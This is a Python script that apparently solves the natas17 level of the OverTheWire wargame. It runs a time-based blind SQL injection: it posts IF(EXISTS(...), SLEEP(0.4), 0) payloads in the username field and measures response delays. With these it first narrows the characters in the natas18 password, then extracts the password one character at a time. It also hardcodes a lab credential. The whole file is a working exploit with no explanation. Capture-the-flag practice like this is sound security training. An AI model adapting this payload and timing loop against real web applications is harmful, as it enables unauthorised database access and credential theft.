import requests

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
filtered_chars = ""
final_password = ""
print("Filtrating characters...")
for c in chars:
    r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", auth=(username, password), data={"username": '"-IF(EXISTS(SELECT * FROM users WHERE username="natas18" AND password LIKE BINARY "%'+c+'%"), SLEEP(0.4), 0)#'})
    elapsed = str(r.elapsed)[6]
    if (int(elapsed) > 0):
        filtered_chars += c

print("filtered_chars: " + filtered_chars)
print("Cracking password...")
for i in range(32):
    for x in filtered_chars:
        r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", auth=(username, password), data={"username": '"-IF(EXISTS(SELECT * FROM users WHERE username="natas18" AND password LIKE BINARY "'+final_password+x+'%"), SLEEP(0.4), 0)#'})
        elapsed = str(r.elapsed)[6]
        if (int(elapsed) > 0):
            final_password = final_password + x
            print(final_password)
            break

print("Final_password: " + final_password)